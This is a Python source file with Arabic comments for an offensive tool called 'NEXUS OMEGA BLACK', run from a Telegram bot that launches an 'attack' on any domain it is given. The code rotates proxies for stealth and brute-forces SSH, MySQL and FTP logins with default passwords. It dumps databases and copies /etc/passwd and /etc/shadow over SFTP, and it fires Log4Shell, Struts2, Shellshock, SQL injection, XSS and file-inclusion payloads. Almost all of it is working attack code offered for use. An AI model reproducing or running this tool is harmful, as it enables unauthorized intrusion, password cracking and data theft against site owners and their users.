#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# NEXUS OMEGA BLACK - REAL EDITION (FIXED)
# تم إصلاح مشكلة البوت نهائياً
# ============================================================

import os
import sys
import re
import json
import time
import socket
import base64
import hashlib
import random
import string
import threading
import subprocess
import urllib.parse
import ssl
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import requests
import mysql.connector
import paramiko
import dns.resolver
import whois
import ftplib
from flask import Flask, jsonify

# ============================================================
# 0. Flask App
# ============================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "👹 NEXUS OMEGA BLACK - REAL EDITION يعمل بشراسة!", 200

@flask_app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

# ============================================================
# 1. الإعدادات
# ============================================================
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TELEGRAM_TOKEN:
    print("❌ TELEGRAM_TOKEN غير موجود")
    sys.exit(1)

TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

PROXY_LIST = [
    "http://51.158.135.187:8811",
    "http://51.158.141.194:8811",
    "http://51.158.133.112:8811",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ============================================================
# 2. محرك التخفي
# ============================================================
class StealthEngine:
    def __init__(self):
        self.session = requests.Session()
        self.rotate_identity()

    def rotate_identity(self):
        self.session.proxies = {"http": random.choice(PROXY_LIST), "https": random.choice(PROXY_LIST)}
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        self.session.verify = False

    def request(self, url, method="GET", data=None, headers=None, timeout=10):
        self.rotate_identity()
        try:
            if method.upper() == "GET":
                return self.session.get(url, timeout=timeout, headers=headers or {})
            else:
                return self.session.post(url, data=data, timeout=timeout, headers=headers or {})
        except:
            return None

# ============================================================
# 3. محرك الاستخبارات
# ============================================================
class IntelEngine:
    def __init__(self, stealth):
        self.stealth = stealth

    def get_whois(self, domain):
        try:
            w = whois.whois(domain)
            return {"registrar": w.registrar, "emails": w.emails, "creation_date": str(w.creation_date)}
        except:
            return {"error": "WHOIS غير متاح"}

    def get_dns(self, domain):
        records = {}
        for rtype in ['A', 'MX', 'NS', 'TXT', 'CNAME']:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                records[rtype] = [str(r) for r in answers]
            except:
                records[rtype] = []
        return records

    def get_headers(self, domain):
        try:
            resp = self.stealth.request(f"https://{domain}")
            if resp:
                return dict(resp.headers)
        except:
            pass
        return {}

    def extract_site_data(self, domain):
        try:
            resp = self.stealth.request(f"https://{domain}")
            if not resp:
                return {"emails": [], "phones": []}
            text = resp.text
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
            phones = re.findall(r'\b(00965|05|03|\+?\d{1,3})?\d{8,12}\b', text)
            return {"emails": list(set(emails)), "phones": list(set(phones))}
        except:
            return {"emails": [], "phones": []}

# ============================================================
# 4. محرك اختراق الخدمات
# ============================================================
class ServiceAttackEngine:
    def __init__(self):
        self.results = {}
        self.passwords = ["", "root", "password", "123456", "admin", "toor", "qwerty", "letmein", "monkey", "dragon", "Passw0rd"]

    def brute_force_ssh(self, ip, username="root"):
        for pwd in self.passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=pwd, timeout=3)
                self.results["ssh"] = {"username": username, "password": pwd}
                ssh.close()
                return True
            except:
                continue
        return False

    def brute_force_mysql(self, ip):
        for pwd in self.passwords:
            try:
                conn = mysql.connector.connect(host=ip, user="root", password=pwd, connection_timeout=3)
                if conn.is_connected():
                    self.results["mysql"] = {"username": "root", "password": pwd}
                    conn.close()
                    return True
            except:
                continue
        return False

    def brute_force_ftp(self, ip):
        for pwd in self.passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, 21)
                ftp.login("anonymous", pwd)
                self.results["ftp"] = {"username": "anonymous", "password": pwd}
                ftp.quit()
                return True
            except:
                continue
        return False

    def attack_all(self, ip):
        self.results = {}
        self.brute_force_ssh(ip)
        self.brute_force_mysql(ip)
        self.brute_force_ftp(ip)
        return self.results

# ============================================================
# 5. محرك الثغرات
# ============================================================
class ZeroDayEngine:
    def __init__(self, stealth):
        self.stealth = stealth
        self.vulnerabilities = []

    def check_log4j(self, url, param="id"):
        payload = "${jndi:ldap://127.0.0.1:1389/Exploit}"
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        resp = self.stealth.request(test_url)
        if resp and "jndi" in resp.text.lower():
            self.vulnerabilities.append("Log4Shell: محتملة")
            return True
        return False

    def check_spring4shell(self, url):
        payload = {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%25{2}i"}
        resp = self.stealth.request(url, method="POST", data=payload)
        if resp and resp.status_code in [200, 500]:
            self.vulnerabilities.append("Spring4Shell: محتملة")
            return True
        return False

    def check_struts2(self, url, param="id"):
        payload = f"redirect:${{%23a%3dnew%20java.lang.ProcessBuilder('id').start()}}"
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        resp = self.stealth.request(test_url)
        if resp and "uid=" in resp.text:
            self.vulnerabilities.append("Struts2: نجحت")
            return True
        return False

    def check_shellshock(self, url):
        headers = {"User-Agent": "() { :; }; /bin/bash -c 'id'"}
        resp = self.stealth.request(url, headers=headers)
        if resp and "uid=" in resp.text:
            self.vulnerabilities.append("ShellShock: نجحت")
            return True
        return False

    def check_sqli(self, url, param="id"):
        payloads = ["'", "' OR '1'='1", "' OR 1=1--"]
        for p in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(p)}"
            resp = self.stealth.request(test_url)
            if resp and any(err in resp.text.lower() for err in ["sql", "mysql", "syntax error"]):
                self.vulnerabilities.append(f"SQLi: {p}")
                return True
        return False

    def check_xss(self, url, param="q"):
        payloads = ['<script>alert("XSS")</script>', '"><script>alert("XSS")</script>']
        for p in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(p)}"
            resp = self.stealth.request(test_url)
            if resp and p in resp.text:
                self.vulnerabilities.append(f"XSS: {p}")
                return True
        return False

    def check_lfi(self, url, param="file"):
        payloads = ["../../../../etc/passwd", "../../../../etc/shadow"]
        for p in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(p)}"
            resp = self.stealth.request(test_url)
            if resp and ("root:" in resp.text or "Administrator" in resp.text):
                self.vulnerabilities.append(f"LFI: {p}")
                return True
        return False

    def scan_all(self, domain, ports):
        base = f"https://{domain}"
        if 80 in ports or 443 in ports:
            self.check_log4j(f"{base}/page.php", "id")
            self.check_spring4shell(f"{base}/api/user")
            self.check_struts2(f"{base}/action", "id")
            self.check_shellshock(base)
            self.check_sqli(f"{base}/page.php", "id")
            self.check_xss(f"{base}/search.php", "q")
            self.check_lfi(f"{base}/view.php", "file")
        return self.vulnerabilities

# ============================================================
# 6. محرك تسريب البيانات
# ============================================================
class DataExfilEngine:
    def steal_mysql_data(self, ip, user, password):
        try:
            conn = mysql.connector.connect(host=ip, user=user, password=password, connection_timeout=5)
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            databases = [db[0] for db in cursor.fetchall()]
            extracted = {}
            for db in databases:
                if db in ["mysql", "information_schema", "performance_schema", "sys"]:
                    continue
                cursor.execute(f"USE {db}")
                cursor.execute("SHOW TABLES")
                tables = [t[0] for t in cursor.fetchall()]
                extracted[db] = {}
                for table in tables:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10")
                    rows = cursor.fetchall()
                    extracted[db][table] = rows
            conn.close()
            return extracted
        except:
            return {}

    def steal_ssh_files(self, ip, user, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            sftp = ssh.open_sftp()
            stolen = {}
            try:
                with sftp.open("/etc/passwd") as f:
                    stolen["/etc/passwd"] = f.read().decode()
            except:
                pass
            try:
                with sftp.open("/etc/shadow") as f:
                    stolen["/etc/shadow"] = f.read().decode()
            except:
                pass
            try:
                with sftp.open("/etc/hosts") as f:
                    stolen["/etc/hosts"] = f.read().decode()
            except:
                pass
            sftp.close()
            ssh.close()
            return stolen
        except:
            return {}

# ============================================================
# 7. النواة الرئيسية
# ============================================================
class NexusOmegaBlack:
    def __init__(self, target):
        self.target_domain = target
        self.target_ip = socket.gethostbyname(target)
        self.stealth = StealthEngine()
        self.intel = IntelEngine(self.stealth)
        self.service = ServiceAttackEngine()
        self.zero_day = ZeroDayEngine(self.stealth)
        self.data_exfil = DataExfilEngine()
        self.report = {}

    def scan_ports(self, ip, ports=None):
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5900, 8080, 8443, 9000]
        open_ports = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((ip, p)) == 0:
                    open_ports.append(p)
                s.close()
            except:
                pass
        return open_ports

    def full_attack(self):
        print(f"🔥 بدأ الهجوم الحقيقي على {self.target_domain}...")
        self.report = {
            "target": self.target_domain,
            "ip": self.target_ip,
            "timestamp": datetime.now().isoformat(),
            "intel": {},
            "vulnerabilities": [],
            "cracked": {},
            "stolen": {},
            "status": "قيد التنفيذ"
        }

        print("[*] جمع المعلومات...")
        self.report["intel"]["whois"] = self.intel.get_whois(self.target_domain)
        self.report["intel"]["dns"] = self.intel.get_dns(self.target_domain)
        self.report["intel"]["headers"] = self.intel.get_headers(self.target_domain)
        self.report["intel"]["site_data"] = self.intel.extract_site_data(self.target_domain)

        print("[*] مسح المنافذ...")
        ports = self.scan_ports(self.target_ip)
        self.report["open_ports"] = ports

        print("[*] اختراق الخدمات...")
        if 22 in ports:
            self.service.brute_force_ssh(self.target_ip)
        if 3306 in ports:
            self.service.brute_force_mysql(self.target_ip)
        if 21 in ports:
            self.service.brute_force_ftp(self.target_ip)
        self.report["cracked"] = self.service.results

        print("[*] تسريب البيانات...")
        if "mysql" in self.service.results:
            cred = self.service.results["mysql"]
            data = self.data_exfil.steal_mysql_data(self.target_ip, cred["username"], cred["password"])
            self.report["stolen"]["mysql"] = data
        if "ssh" in self.service.results:
            cred = self.service.results["ssh"]
            files = self.data_exfil.steal_ssh_files(self.target_ip, cred["username"], cred["password"])
            self.report["stolen"]["ssh_files"] = files

        print("[*] فحص الثغرات...")
        self.report["vulnerabilities"] = self.zero_day.scan_all(self.target_domain, ports)

        self.report["status"] = "تم التنفيذ بنجاح"
        print("✅ تم الانتهاء من الهجوم!")
        return self.report

# ============================================================
# 8. تشغيل البوت بشكل صحيح
# ============================================================
def start_bot():
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes
        
        app = Application.builder().token(TELEGRAM_TOKEN).build()
        
        async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
            await update.message.reply_text(
                "👹 NEXUS OMEGA BLACK - REAL EDITION\n"
                "/attack <دومين> - هجوم شامل\n"
                "/scan <IP> - مسح المنافذ\n"
                "/status - حالة البوت"
            )
        
        async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
            if not context.args:
                await update.message.reply_text("❗ استخدم: /attack <دومين>")
                return
            domain = context.args[0]
            await update.message.reply_text(f"🔥 بدأ الهجوم على {domain}...")
            engine = NexusOmegaBlack(domain)
            report = engine.full_attack()
            report_text = json.dumps(report, indent=2, default=str)
            for i in range(0, len(report_text), 4000):
                await update.message.reply_text(report_text[i:i+4000])
        
        async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
            if not context.args:
                await update.message.reply_text("❗ استخدم: /scan <IP>")
                return
            ip = context.args[0]
            engine = NexusOmegaBlack("example.com")
            ports = engine.scan_ports(ip)
            await update.message.reply_text(f"📡 المنافذ المفتوحة على {ip}:\n{', '.join(map(str, ports))}")
        
        async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
            await update.message.reply_text("✅ NEXUS OMEGA BLACK REAL EDITION يعمل بشراسة!")
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("attack", attack))
        app.add_handler(CommandHandler("scan", scan))
        app.add_handler(CommandHandler("status", status))
        
        print("✅ البوت يعمل...")
        app.run_polling()
    except Exception as e:
        print(f"⚠️ فشل البوت: {e}")

# ============================================================
# 9. التشغيل الرئيسي
# ============================================================
if __name__ == "__main__":
    print(r"""
   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
         [ NEXUS OMEGA BLACK - REAL EDITION ] 👹💀☠️
    """)
    
    # تشغيل Flask في خلفية
    def run_flask():
        port = int(os.environ.get("PORT", 10000))
        flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # تشغيل البوت
    start_bot()
